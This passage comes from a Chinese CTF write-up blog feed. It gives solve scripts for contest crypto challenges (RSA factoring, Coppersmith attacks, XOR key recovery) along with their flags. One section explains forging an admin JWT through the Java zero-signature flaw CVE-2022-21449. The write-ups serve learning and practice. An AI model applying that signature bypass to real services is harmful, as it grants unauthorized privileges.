class="line">PR2.&lt;y&gt; = PolynomialRing(Zmod(n3), <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">g = e3*y - b</span><br><span class="line">y0 = g.monic().small_roots(X=<span class="number">2</span>^<span class="number">700</span>,beta=<span class="number">0.75</span>,epsilon=<span class="number">0.05</span>)[<span class="number">0</span>]</span><br><span class="line">p3 = gcd(e3*y0 - b, n3)</span><br><span class="line">p3 = <span class="built_in">int</span>(iroot(<span class="built_in">int</span>(p3), <span class="number">6</span>)[<span class="number">0</span>])</span><br><span class="line">q3 = n3 // p3^<span class="number">7</span></span><br><span class="line">phi3 = (p3^<span class="number">7</span> - p3^<span class="number">6</span>) * (q3 - <span class="number">1</span>)</span><br><span class="line">d3 = inverse_mod(e3, phi3)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c3, d3, n3)))</span><br><span class="line"><span class="comment">#b&#x27;qwb&#123;8633ce6d-fece-4cf1-8f0f-f27e5bf6d678&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="myJWT"><a href="#myJWT" class="headerlink" title="myJWT"></a>myJWT</h1><p>cve-2022-21449，参考soreatu师傅的博客：</p><p><a href="https://blog.soreatu.com/posts/analysis-of-cve-2022-21449-bypass-java-signature-check-by-two-zeros/">https://blog.soreatu.com/posts/analysis-of-cve-2022-21449-bypass-java-signature-check-by-two-zeros/</a></p><p>关键是让sig传(0, 0)，查看代码后发现第一段不变，sig传0但是要考虑编码，b’A’就是0</p><p>nc连上去，获取token，所以第一段jwt不变，第二段jwt把admin的值改为true，第三段放A</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20220803133111714.png" alt="image-20220803133111714"></p><h1 id="polydiv"><a href="#polydiv" class="headerlink" title="polydiv"></a>polydiv</h1><p>看代码看半天，nc一下就知道是怎么回事了，浪费了不少时间</p><p>先过hash截断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dehash</span>(<span class="params">s, re</span>):</span></span><br><span class="line">    alphabet = string.ascii_letters+string.digits</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> alphabet:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> alphabet:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> alphabet:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> alphabet:</span><br><span class="line">                    ss=s+a+b+c+d</span><br><span class="line">                    <span class="keyword">if</span>  <span class="built_in">bin</span>(<span class="built_in">int</span>(sha256(ss.encode()).hexdigest(),<span class="number">16</span>)).endswith(re):</span><br><span class="line">                        <span class="keyword">return</span> a+b+c+d</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(dehash(<span class="string">&#x27;GTgC3xzo&#x27;</span>, <span class="string">&#x27;00000000000000000000&#x27;</span>))</span><br></pre></td></tr></table></figure><p>题目给r = a*b+c，已知r，a，c要求b，只不过这里的abcr都是在模2的多项式下的，sage直接除会显示分式，应该是要给个模</p><p>nc后发现r的最高次都是14，a的是7，那么b的最高位也是7，爆破就能出，复杂度为2^8，很快</p><p>但是因为之前看代码用了太多时间，加上有点紧张，于是是手动40次出的（x</p><p>爆破代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">R = PolynomialRing(GF(<span class="number">2</span>),<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">x = R.gen()</span><br><span class="line">r = x^<span class="number">14</span> + x^<span class="number">12</span> + x^<span class="number">10</span> + x^<span class="number">8</span> + x^<span class="number">7</span> + x^<span class="number">5</span> + x^<span class="number">3</span> + x^<span class="number">2</span> + x</span><br><span class="line">a = x^<span class="number">7</span> + x^<span class="number">5</span> + x^<span class="number">4</span> + x + <span class="number">1</span></span><br><span class="line">c = x^<span class="number">6</span> + x^<span class="number">3</span> + x</span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> i3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">for</span> i4 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">for</span> i5 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                    <span class="keyword">for</span> i6 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                        <span class="keyword">for</span> i7 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                            <span class="keyword">for</span> i8 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                                b = i1 + i2*x + i3*x^<span class="number">2</span> + i4*x^<span class="number">3</span> + i5*x^<span class="number">4</span> + i6*x^<span class="number">5</span> + i7*x^<span class="number">6</span> + i8*x^<span class="number">7</span></span><br><span class="line"><span class="comment">#                                 print(b)</span></span><br><span class="line">                                <span class="keyword">if</span> b*a == r-c:</span><br><span class="line">                                    <span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><h1 id="ASR"><a href="#ASR" class="headerlink" title="ASR"></a>ASR</h1><p>生成没什么说法，先开根，然后用yafu一顿暴力分解，多开几个挂1个多小时，然后分出来了。可惜还是慢了，第五出的没拿到血</p><p>分解之后要分析一下：e | P2 and e | P4，本来想的是分别开根然后crt。但是P1和P3已经凑够了512位，如果m也达到这个位数，那len(m)就有64位了，题目给的len是48，因此可直接用P1和P3出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.residue_ntheory <span class="keyword">import</span> nthroot_mod</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">8250871280281573979365095715711359115372504458973444367083195431861307534563246537364248104106494598081988216584432003199198805753721448450911308558041115465900179230798939615583517756265557814710419157462721793864532239042758808298575522666358352726060578194045804198551989679722201244547561044646931280001</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">945272793717722090962030960824180726576357481511799904903841312265308706852971155205003971821843069272938250385935597609059700446530436381124650731751982419593070224310399320617914955227288662661442416421725698368791013785074809691867988444306279231013360024747585261790352627234450209996422862329513284149</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">P1 = <span class="number">223213222467584072959434495118689164399</span></span><br><span class="line">P2 = <span class="number">218566259296037866647273372633238739089</span></span><br><span class="line">P3 = <span class="number">260594583349478633632570848336184053653</span></span><br><span class="line">P4 = <span class="number">225933944608558304529179430753170813347</span></span><br><span class="line"></span><br><span class="line">phi = P1*(P1-<span class="number">1</span>)*P2*(P2-<span class="number">1</span>)*P3*(P3-<span class="number">1</span>)*P4*(P4-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">assert</span> P1**<span class="number">2</span>*P2**<span class="number">2</span>*P3**<span class="number">2</span>*P4**<span class="number">2</span> == n</span><br><span class="line"></span><br><span class="line">phi_ = P1*(P1-<span class="number">1</span>)*P3*(P3-<span class="number">1</span>)</span><br><span class="line">d0 = inverse_mod(e, phi_)</span><br><span class="line">m0 = <span class="built_in">pow</span>(c, d0, P1^<span class="number">2</span>*P3^<span class="number">2</span>)</span><br><span class="line"><span class="comment"># d1 = nthroot_mod(c,e,P2^2,all_roots=True)</span></span><br><span class="line"><span class="comment"># d2 = nthroot_mod(c,e,P4^2,all_roots=True)</span></span><br><span class="line">long_to_bytes(m0)</span><br><span class="line"><span class="comment">#b&#x27;flag&#123;Fear_can_hold_you_prisoner_Hope_can_set_you_free&#125;\x06\x06\x06\x06\x06\x06&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;做了四道，获得了18名&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://sh1k4ku.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>CCTF</title>
    <link href="http://sh1k4ku.github.io/2022/07/17/CCTF/"/>
    <id>http://sh1k4ku.github.io/2022/07/17/CCTF/</id>
    <published>2022-07-17T08:56:12.000Z</published>
    <updated>2022-07-19T14:45:31.200Z</updated>
    
    <content type="html"><![CDATA[<p>复盘咯</p><span id="more"></span><h1 id="WARM-UP"><a href="#WARM-UP" class="headerlink" title="WARM-UP"></a>WARM-UP</h1><h2 id="Mic-Check"><a href="#Mic-Check" class="headerlink" title="Mic Check"></a>Mic Check</h2><p>点进去就有</p><h1 id="EASY"><a href="#EASY" class="headerlink" title="EASY"></a>EASY</h1><h2 id="Klamkin"><a href="#Klamkin" class="headerlink" title="Klamkin"></a>Klamkin</h2><p>求一元一次方程的解，给了一组x、y，直接移位就有了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;04.cr.yp.toc.tf&#x27;</span>, <span class="number">13777</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;[Q]uit\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;G&#x27;</span>)</span><br><span class="line">q = <span class="built_in">int</span>(io.recvline().split()[-<span class="number">1</span>])</span><br><span class="line">r = <span class="built_in">int</span>(io.recvline().split()[-<span class="number">1</span>])</span><br><span class="line">s = <span class="built_in">int</span>(io.recvline().split()[-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(q,r,s)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;[Q]uit\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;S&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;that &#x27;</span>)</span><br><span class="line">    u = io.recvuntil(<span class="string">b&#x27; &#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;is &#x27;</span>)</span><br><span class="line">    num = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;-&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">    io.recvline()</span><br><span class="line">    <span class="keyword">if</span> u == <span class="string">b&#x27;x&#x27;</span>:</span><br><span class="line">        inv = (gp.invert(r, q) * s) % q</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(<span class="number">1</span>&lt;&lt;(num - <span class="number">1</span>)) + <span class="string">&#x27;, &#x27;</span> + <span class="built_in">str</span>((inv * (<span class="number">1</span>&lt;&lt;(num - <span class="number">1</span>)) % q)))</span><br><span class="line">    <span class="keyword">elif</span> u == <span class="string">b&#x27;y&#x27;</span>:</span><br><span class="line">        inv = (gp.invert(s, q) * r) % q</span><br><span class="line">        io.sendline(<span class="built_in">str</span>((inv * (<span class="number">1</span>&lt;&lt;(num - <span class="number">1</span>)) % q)) + <span class="string">&#x27;, &#x27;</span> +  <span class="built_in">str</span>(<span class="number">1</span>&lt;&lt;(num - <span class="number">1</span>)))</span><br><span class="line">    io.recvline()</span><br><span class="line"><span class="comment">#CCTF&#123;f1nDin9_In7Eg3R_50Lut1Ons_iZ_in73rEStIn9!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Baphomet"><a href="#Baphomet" class="headerlink" title="Baphomet"></a>Baphomet</h2><p>’CCTF‘爆破key，截前面一部分key解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">c = f.read()</span><br><span class="line">msg = <span class="string">&#x27;CCTF&#123;&#x27;</span></span><br><span class="line">ba = b64encode(msg.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">baph = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> ba.decode(<span class="string">&#x27;utf-8&#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span> b.islower():</span><br><span class="line">        baph += b.upper()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        baph += b.lower()</span><br><span class="line">baph = baph.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(baph)</span><br><span class="line">key = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(baph)):</span><br><span class="line">    key += (baph[i] ^ c[i]).to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">key = key[:<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    flag += (c[i] ^ key[i % <span class="built_in">len</span>(key)]).to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> flag.decode(<span class="string">&#x27;utf-8&#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span> f.islower():</span><br><span class="line">        msg += f.upper()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        msg += f.lower()</span><br><span class="line">msg = msg.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(b64decode(msg))</span><br><span class="line"><span class="comment">#b&#x27;CCTF&#123;UpP3r_0R_lOwER_17Z_tH3_Pr0bL3M&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="MEDIUM-EASY"><a href="#MEDIUM-EASY" class="headerlink" title="MEDIUM-EASY"></a>MEDIUM-EASY</h1><h2 id="sots"><a href="#sots" class="headerlink" title="sots"></a>sots</h2><p><code>He who abides far away from his home, is ever longing for the day he shall return.</code></p><p>求<script type="math/tex">x^2+y^2=n, n已知</script></p><p>丢番图方程，可以用<a href="https://www.alpertron.com.ar/QUAD.HTM">在线网站</a>解，也可以调库two_square()</p><p>梭了</p><p>CCTF{3Xpr3sS_4z_Th3_sUm_oF_7w0_Squ4rE5!}</p><h2 id="polyRSA"><a href="#polyRSA" class="headerlink" title="polyRSA"></a>polyRSA</h2><p>直接roots</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e = <span class="number">31337</span></span><br><span class="line">n = <span class="number">44538727182858207226040251762322467288176239968967952269350336889655421753182750730773886813281253762528207970314694060562016861614492626112150259048393048617529867598499261392152098087985858905944606287003243</span></span><br><span class="line">c = <span class="number">37578889436345667053409195986387874079577521081198523844555524501835825138236698001996990844798291201187483119265306641889824719989940722147655181198458261772053545832559971159703922610578530282146835945192532</span></span><br><span class="line"></span><br><span class="line">P = PolynomialRing(ZZ, <span class="string">&#x27;k&#x27;</span>)</span><br><span class="line">k = P.gen()</span><br><span class="line">p = k**<span class="number">6</span> + <span class="number">7</span>*k**<span class="number">4</span> - <span class="number">40</span>*k**<span class="number">3</span> + <span class="number">12</span>*k**<span class="number">2</span> - <span class="number">114</span>*k + <span class="number">31377</span></span><br><span class="line">q = k**<span class="number">5</span> - <span class="number">8</span>*k**<span class="number">4</span> + <span class="number">19</span>*k**<span class="number">3</span> - <span class="number">313</span>*k**<span class="number">2</span> - <span class="number">14</span>*k + <span class="number">14011</span></span><br><span class="line">f = p*q -n</span><br><span class="line">x = f.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"><span class="comment">#k = 9291098683758154336</span></span><br><span class="line">p = p(x)</span><br><span class="line">q = q(x)</span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br></pre></td></tr></table></figure><h2 id="infinity-castle"><a href="#infinity-castle" class="headerlink" title="infinity castle"></a>infinity castle</h2><p>diamond是平方，triage是立方，summarize是对<script type="math/tex">\sqrt{n}</script>进行积分，find是计算泰勒级数</p><script type="math/tex; mode=display">summarize返回的值\approx \frac{\sqrt{2}}{2} +\sqrt{3}+\sqrt{4}+···+\frac{\sqrt{n}}{2}\\所以是\sqrt{n}从2到n的积分</script><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2  <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">cip, key</span>):</span></span><br><span class="line">repeation = <span class="number">1</span> + (<span class="built_in">len</span>(cip) // <span class="built_in">len</span>(key))</span><br><span class="line">key = key * repeation</span><br><span class="line">key = key[:<span class="built_in">len</span>(cip)]</span><br><span class="line"></span><br><span class="line">msg = <span class="built_in">bytes</span>([c ^^ k <span class="keyword">for</span> c, k <span class="keyword">in</span> <span class="built_in">zip</span>(cip, key)])</span><br><span class="line"><span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">diamond</span>(<span class="params">num</span>):</span> <span class="comment">#平方</span></span><br><span class="line"><span class="keyword">return</span> num ** <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">triage</span>(<span class="params">num</span>):</span><span class="comment">#立方</span></span><br><span class="line"><span class="keyword">return</span> num ** <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">summarize</span>(<span class="params">b</span>):</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>/<span class="number">3</span> * b**(<span class="number">3</span>/<span class="number">2</span>) - <span class="number">2</span>/<span class="number">3</span> * <span class="number">2</span>**(<span class="number">3</span>/<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">c0 = <span class="number">194487778980461745865921475300460852453586088781074246328543689440168930873549359227127363759885970436167330043371627413542337857082400024590112412164095470165662281502211335756288082198009158469871465280749846525326701136380764079685636158337203211609233704905784093776008350120607841177268965738426317288541638374141671346404729428158104872411498098187946543666987926130124245185069569476433120128275581891425551325847219504501925282012199947834686225770246801353666030075146469275695499044424390475398423700504158154044180028733800154044746648133536737830623670383925046006108348861714435567006327619892239876863209887013290251890513192375749866675256952802329688897844132157098061758362137357387787072005860610663777569670198971946904157425377235056152628515775755249828721767845990597859165193162537676147173896835503209596955703313430433124688537275895468076469102220355973904702901083642275544954262724054693167603475188412046722656788470695566949847884250306735314144182029335732280420629131990311054229665691517003924788583771265625694414774865289407885678238795596912006567817508035434074250123869676396153982762032750080222602796273083162627489526255501643913672882350236497429678928099868244687228703074267962827621792960</span></span><br><span class="line">c1 = <span class="number">102325064080381160170299055162846304227217463467232681115953623386548494169967745781550171804781503102663445039561476870208178139548389771866145006535051362059443515034504958703659546162037904784821960707630188600064568878674788077706711506213779443920430038560373854184526850365974450688458342413544179732143225845085164110594063440979455274250021370090572731855665413325275414458572412561502408983107820534723804225765540316307539962199024757378469001612921489902325166003841336027940632451584642359132723894801946906069322200784708303615779699081247051006259449466759863245508473429631466831174013498995506423210088549372249221415401309493511477847517923201080509933268996867995533386571564898914042844521373220497356837599443280354679778455765441375957556266205953496871475611269965949025704864246188576674107448587696941054123618319505271195780178776338475090463487960063464172195337956577785477587755181298859587398321270677790915227557908728226236404532915215698698185501562405374498053670694387354757252731874312411228777004316623425843477845333936913444143768519959591070492639650368662529749434618783626718975406802741753688956961837855306815380844030665696781685152837849982159679122660714556706669865596780528277684800454866433826417980212164051043504955615794706595412705883261111953152250227679858538249797999044336210905975316421254442221408945203647754303635775048438188044803368249944201671941949138202928389951227347433255867504906597772044398973241425387514239164853656233776024571606159378910745571588836981735827902305330330946219857271646498602227088657739442867033212012876837654750348578740516798444734534291467314881324902354425889448102902750077077381896216130734894767553834949561471219923459897244690006643798812989271282475503126962274052192342840870308710338336817452628324667507548265612892611100350882163205858101959976</span></span><br><span class="line">enc = <span class="number">122235247669762131006183252122503937958296387791525458429403709404875223067116491817728568224832483391622109986550732469556761300197133827976956875865159629512476600711420561872409721582387803219651736262581445978042694384374119142613277808898398213602093802571586386354257378956087240174787723503606671543195193114158641301908622673736098768829071270132073818245595918660134745516367731595853832524328488074054536278197115937409643221809577554866060292157239061557708159310445977052686561229611117673473208278176118561352693319461471419694590218295911647368543698198762827636021268989705079848502749837879584394379300566277359149621932579222865430374652678738198451655509408564586496375811666876030847654260305392984710580761255795785508407844683687773983669843744274915862335181251050775093896006210092665809300090715190088851654138383362259256212093670748527819287681468901379286722214112321906917311154811516336259463356911326393701445497605365038857575515541024824906818473933597129846235905072394148879079996812146836910199111439031562946495046766063326815863624262541346543552652673629442370320109404700346028639853707278295255350982238521659924641921142615894039995513480511108116053798143154593343124822462519555715118822045</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">pandq = iroot(c1,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">assert</span> c0 % pandq == <span class="number">0</span></span><br><span class="line">p_q = c0 // pandq</span><br><span class="line">p = (pandq + p_q) // <span class="number">2</span></span><br><span class="line">q = pandq - p</span><br><span class="line"><span class="keyword">assert</span> c1 == (p + q) ** <span class="number">3</span></span><br><span class="line">n = <span class="built_in">int</span>(p * q)</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">xor_key = long_to_bytes(<span class="built_in">int</span>(summarize(n)))</span><br><span class="line">enc = long_to_bytes(<span class="built_in">pow</span>(enc, d, n))</span><br><span class="line">flag = xor(enc, xor_key) </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#CCTF&#123;Mix1ng_c4lcUluS_w17h_Numb3r_The0Rry_S33ms_s7r0ng_cRyp70_Sch3m4!!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="keydream"><a href="#keydream" class="headerlink" title="keydream"></a>keydream</h2><p>给两头的copper</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"></span><br><span class="line">n = <span class="number">23087202318856030774680571525957068827041569782431397956837104908189620961469336659300387982516148407611623358654041246574100274275974799587138270853364165853708786079644741407579091918180874935364024818882648063256767259283714592098555858095373381673229188828791636142379379969143042636324982275996627729079</span></span><br><span class="line">c = <span class="number">3621516728616736303019716820373078604485184090642291670706733720518953475684497936351864366709813094154736213978864841551795776449242009307288704109630747654430068522939150168228783644831299534766861590666590062361030323441362406214182358585821009335369275098938212859113101297279381840308568293108965668609</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">p_high = bytes_to_long(<span class="string">b&#x27;CCTF&#123;it_is_fake_flag_&#x27;</span>)</span><br><span class="line">p_low = bytes_to_long(<span class="string">b&#x27;_90OD_luCk___!!&#125;&#x27;</span>)</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = p_high * <span class="number">2</span>^(<span class="number">43</span>*<span class="number">8</span>) + x * <span class="number">2</span>^(<span class="number">16</span>*<span class="number">8</span>) + p_low</span><br><span class="line">roots = f.monic().small_roots(X = <span class="number">2</span>^(<span class="number">27</span>*<span class="number">8</span>), beta = <span class="number">0.4</span>)</span><br><span class="line">p = <span class="built_in">int</span>(f(roots[<span class="number">0</span>]))</span><br><span class="line"><span class="keyword">assert</span> n%p == <span class="number">0</span></span><br><span class="line">q = n//p</span><br><span class="line">d = inverse_mod(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#b&#x27;Congratz, the flag is: 